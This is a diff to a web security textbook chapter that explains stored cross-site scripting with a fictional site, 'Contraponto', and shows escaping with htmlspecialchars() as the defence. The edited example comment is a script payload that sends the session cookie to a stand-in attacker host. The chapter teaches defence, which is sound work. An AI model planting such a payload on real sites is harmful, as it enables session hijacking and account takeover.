@@ -125,7 +125,9 @@ A normal comment, such as `Muito bom!`, appears as it was written. A comment wit
 The attack unfolds in five steps. The attacker writes a malicious comment, for example:
 
 ```html
-<script>document.location='http://atacante.com/roubo?c='+document.cookie</script>
+<script>
+  document.location='http://atacante.com/roubo?c='+document.cookie
+</script>
 ```
 
 The Contraponto site stores and displays it. When an authenticated user, such as Rita, the site manager, opens the page, she receives it with the `<script>` inside, and the code runs in her *browser*. The *script* sends this site's session *cookie* to the attacker, without Rita seeing anything, and the attacker uses that *cookie* to enter the site as Rita, with her privileges (@sec-07-sessions-en). Note that the *script* can only read the *cookies* of the site itself: those of other sites, such as the bank, remain out of reach.
@@ -137,13 +139,9 @@ The defence is to always escape the text coming from users before displaying it 
 echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";
 ```
 
-| What the attacker writes | The generated HTML | What the *browser* does |
-|:----------------------|:----------------------------------|:-------------------------|
-| `<script>alert(1)</script>` | `&lt;script&gt;alert(1)&lt;/script&gt;` | shows the text, does not execute it |
-
-: The effect of `htmlspecialchars()`. {#tbl-09-escape-en}
-
-This way, the attacker's text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.
+For example, the text `<script>alert(1)</script>` becomes
+`&lt;script&gt;alert(1)&lt;/script&gt;`: the *browser* shows the text and does not
+execute it. This way, the attacker's text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.
 
 ### CSRF (Cross-Site Request Forgery) {#sec-09-csrf-en}
 
